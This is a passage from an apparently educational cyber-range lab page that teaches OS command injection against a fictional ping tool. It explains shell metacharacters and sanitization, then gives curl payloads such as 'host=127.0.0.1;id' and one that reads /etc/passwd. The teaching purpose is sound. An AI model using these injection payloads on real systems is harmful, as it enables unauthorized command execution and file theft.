@@ -1,0 +1,1344 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Network forensics exercises for OpenCyberRange">
+      
+      
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.2">
+    
+    
+      
+        <title>Exercise 6: Command Injection - Network Forensics</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css?v=4">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="deep-purple" data-md-color-accent="purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#exercise-6-command-injection" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Network Forensics" class="md-header__button md-logo" aria-label="Network Forensics" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Network Forensics
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Exercise 6: Command Injection
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="deep-purple" data-md-color-accent="purple"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="deep-purple" data-md-color-accent="purple"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Network Forensics" class="md-nav__button md-logo" aria-label="Network Forensics" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Network Forensics
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH N1 -- Log Analysis
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH N1 -- Log Analysis
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/01_Port_Scan_Detection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.1 -- Port Scan Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/02_HTTP_Traffic_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.2 -- HTTP Traffic Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/03_DNS_Anomaly_Detection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.3 -- DNS Anomaly Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/04_Failed_Login_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.4 -- Failed Login Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/05_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH N2 -- PCAP Forensics
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH N2 -- PCAP Forensics
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/01_FTP_Credential_Extraction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.1 -- FTP Credential Extraction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/02_SMTP_Email_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.2 -- SMTP Email Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/03_HTTP_Session_Hijacking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.3 -- HTTP Session Hijacking
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/04_DNS_Data_Exfiltration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.4 -- DNS Data Exfiltration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/05_Attack_Chain_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.5 -- Attack Chain Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/06_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH N3 -- Firewalls
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH N3 -- Firewalls
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NETSY12_Firewalls/01_Firewall_Fundamentals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 3.1 -- Firewall Fundamentals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NETSY12_Firewalls/02_Firewall_Policy_Hardening/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 3.2 -- Firewall Policy Hardening
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#before-you-begin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Before You Begin
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#scenario" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scenario
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#your-objectives" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Your Objectives
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#background-os-command-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Background: OS Command Injection
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tool-primer-curl-post-requests" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tool Primer: curl POST Requests
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#walkthrough" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Walkthrough
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Walkthrough">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-launch-the-exercise" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 1: Launch the Exercise
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-use-the-ping-tool-normally" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 2: Use the Ping Tool Normally
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-test-for-command-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 3: Test for Command Injection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-read-the-application-token" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 4: Read the Application Token
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-5-read-the-root-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 5: Read the Root Flag
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#record-your-findings" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Record Your Findings
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-6-interpret-the-results" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 6: Interpret the Results
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-7-submit-the-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 7: Submit the Flag
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#analysis-questions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Analysis Questions
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#key-takeaways" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Key Takeaways
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="exercise-6-command-injection">Exercise 6: Command Injection</h1>
+<h2 id="before-you-begin">Before You Begin</h2>
+<p>Week 5 introduced API (Application Programming Interface) testing, where you crafted requests to interact with backend services and extract data through application logic flaws. Week 6 escalates from data extraction to code execution; instead of reading information the application was not meant to expose, you will execute operating system commands on the server itself. Your VPN must be connected and your terminal open before continuing.</p>
+<h2 id="scenario">Scenario</h2>
+<p>CloudPing Diagnostics offers a web-based network diagnostic tool that customers use to test connectivity to their cloud infrastructure. The tool accepts a hostname or IP address and runs a ping test, displaying the results in the browser.</p>
+<p>Tom Bradley (Lead Developer) built the tool as a weekend project: "It is a wrapper around the ping command. Takes the hostname, runs ping, shows the output. Nothing fancy."</p>
+<p>Your assessment scope covers the diagnostic tool and the underlying server. Two tokens have been placed on the system; one accessible through basic command injection and one requiring deeper filesystem access. Your job is to determine whether the ping feature can be abused to run arbitrary commands.</p>
+<h2 id="your-objectives">Your Objectives</h2>
+<p>The CloudPing diagnostic tool presents a specific attack surface worth investigating. Your goals for the assessment are listed below.</p>
+<ul>
+<li>Identify a web application feature that interacts with the operating system</li>
+<li>Test for OS (Operating System) command injection using shell metacharacters</li>
+<li>Exploit command injection to execute arbitrary commands on the server</li>
+<li>Read restricted files through injected commands</li>
+<li>Assemble and submit the flag in <code>OCR{...}</code> format</li>
+</ul>
+<hr />
+<h2 id="background-os-command-injection">Background: OS Command Injection</h2>
+<p>Web applications sometimes need to interact with the underlying operating system. A network diagnostic tool might call the system's <code>ping</code> command, a file converter might invoke <code>ffmpeg</code>, or a monitoring dashboard might run <code>df</code> to check disk usage. When an application takes user input and passes it directly to a system shell without sanitization, attackers can inject additional commands that the server executes blindly.</p>
+<p>Shell interpreters like <code>bash</code> and <code>sh</code> treat certain characters as metacharacters; symbols that change how a command line is parsed. The semicolon (<code>;</code>) separates two independent commands, so <code>ping 127.0.0.1; id</code> runs <code>ping</code> first and then runs <code>id</code>. The pipe (<code>|</code>) sends the output of one command into another. Double ampersand (<code>&amp;&amp;</code>) runs the second command only if the first succeeds, and double pipe (<code>||</code>) runs the second command only if the first fails. An attacker who controls part of a command string can use any of these metacharacters to append their own commands.</p>
+<p>Input sanitization is the primary defense against command injection. A secure application validates that the user's input matches the expected format (for example, an IP address should contain only digits and dots), uses allowlists to restrict acceptable input, or avoids calling system commands entirely by using language-native libraries. Without these controls, any command the web server process can execute is available to the attacker.</p>
+<pre class="mermaid"><code>graph TD
+    A["User enters&lt;br/&gt;127.0.0.1"] --&gt;|"Normal input"| B["Server runs&lt;br/&gt;ping 127.0.0.1"]
+    B --&gt; C["Ping output&lt;br/&gt;returned to browser"]
+    D["User enters&lt;br/&gt;127.0.0.1; cat /etc/passwd"] --&gt;|"Injected input"| E["Server runs&lt;br/&gt;ping 127.0.0.1;&lt;br/&gt;cat /etc/passwd"]
+    E --&gt; F["Ping output +&lt;br/&gt;file contents&lt;br/&gt;returned"]
+
+    style A fill:#4a90d9,color:#fff
+    style B fill:#6aaa64,color:#fff
+    style C fill:#6aaa64,color:#fff
+    style D fill:#d9534f,color:#fff
+    style E fill:#d9534f,color:#fff
+    style F fill:#d9534f,color:#fff</code></pre>
+<p>The diagram above contrasts a normal ping request with an injected command. The normal path runs only the intended <code>ping</code> command, while the injected path appends a second command that reads a sensitive file from the server.</p>
+<h2 id="tool-primer-curl-post-requests">Tool Primer: curl POST Requests</h2>
+<p>Previous labs used <code>curl</code> for GET requests, where data travels in the URL. The CloudPing diagnostic tool accepts input through an HTTP (Hypertext Transfer Protocol) POST request, where data travels in the request body instead. The <code>-X POST</code> flag tells <code>curl</code> to use the POST method, and the <code>-d</code> flag attaches form data to the request body.</p>
+<div class="admonition kali">
+<p class="admonition-title">Send a basic POST request with form data</p>
+<p>The <code>-d</code> flag sends the string <code>host=127.0.0.1</code> as URL-encoded form data. The server receives the value <code>127.0.0.1</code> in the <code>host</code> parameter and uses it to run the ping command.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://&lt;target&gt;/ping<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;host=127.0.0.1&#39;</span>
+</code></pre></div>
+<p>The response returns the ping output the server produced for the value you supplied.</p>
+</div>
+<div class="admonition kali">
+<p class="admonition-title">Send an injection payload</p>
+<p>The semicolon after the IP address tells the shell to run a second command (<code>id</code>) after the ping.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://&lt;target&gt;/ping<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;host=127.0.0.1;id&#39;</span>
+</code></pre></div>
+<p>If the server is vulnerable, the response will contain both the ping output and the output of the <code>id</code> command.</p>
+</div>
+<div class="admonition kali">
+<p class="admonition-title">URL-encode special characters when needed</p>
+<p>Some characters need URL encoding when sent in POST data. The semicolon (<code>;</code>) works without encoding in most cases, but if a payload is not working, try encoding special characters. For example, a space becomes <code>%20</code> and a semicolon becomes <code>%3B</code>. The <code>--data-urlencode</code> flag handles encoding automatically.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://&lt;target&gt;/ping<span class="w"> </span>--data-urlencode<span class="w"> </span><span class="s1">&#39;host=127.0.0.1;cat /etc/passwd&#39;</span>
+</code></pre></div>
+<p>Encoding the payload helps when raw metacharacters get stripped or mangled in transit.</p>
+</div>
+<hr />
+<h2 id="walkthrough">Walkthrough</h2>
+<h3 id="step-1-launch-the-exercise">Step 1: Launch the Exercise</h3>
+<p>Open the platform in your browser and start the exercise environment. You need running containers before any web requests will reach the target.</p>
+<ul>
+<li>Navigate to <strong>Exercises</strong> and locate <strong>Exercise 6; Command Injection</strong></li>
+<li>Click <strong>Launch</strong> and wait for the status to change to <strong>Running</strong></li>
+<li>Note the <strong>target IP</strong> displayed in the Active Lab View</li>
+</ul>
+<h3 id="step-2-use-the-ping-tool-normally">Step 2: Use the Ping Tool Normally</h3>
+<p>Before testing for vulnerabilities, observe how the application behaves with legitimate input. Sending a normal request first establishes a baseline so you can recognize when output changes.</p>
+<p>Run a valid ping request using the loopback address.</p>
+<div class="admonition kali">
+<p class="admonition-title">Send a baseline ping request</p>
+<p>Replace <code>&lt;target&gt;</code> with the IP address shown in the Active Lab View. Sending a clean request first establishes a baseline so you can recognize when the output changes.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://&lt;target&gt;/ping<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;host=127.0.0.1&#39;</span>
+</code></pre></div>
+<p>The response should contain standard ping output; lines showing <code>bytes from 127.0.0.1</code> with round-trip times. The application took your input, passed it to the system <code>ping</code> command, and returned the results.</p>
+</div>
+<h3 id="step-3-test-for-command-injection">Step 3: Test for Command Injection</h3>
+<p>Now test whether the application sanitizes user input before passing it to the shell. The semicolon (<code>;</code>) is the most common metacharacter for separating commands in a Linux shell. Appending <code>; id</code> after a valid IP address will reveal whether the server executes a second command.</p>
+<div class="admonition kali">
+<p class="admonition-title">Inject the id command</p>
+<p>Append <code>;id</code> to the host value so the shell runs <code>id</code> after the ping completes.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://&lt;target&gt;/ping<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;host=127.0.0.1;id&#39;</span>
+</code></pre></div>
+<p>Examine the response carefully. If command injection is possible, you will see the normal ping output followed by a line containing <code>uid=</code>, <code>gid=</code>, and <code>groups=</code>: the output of the <code>id</code> command. The presence of the <code>id</code> output confirms that the server executed your injected command.</p>
+</div>
+<div class="admonition kali">
+<p class="admonition-title">Confirm with whoami</p>
+<p>Run a simpler payload to double-check the injection point.</p>
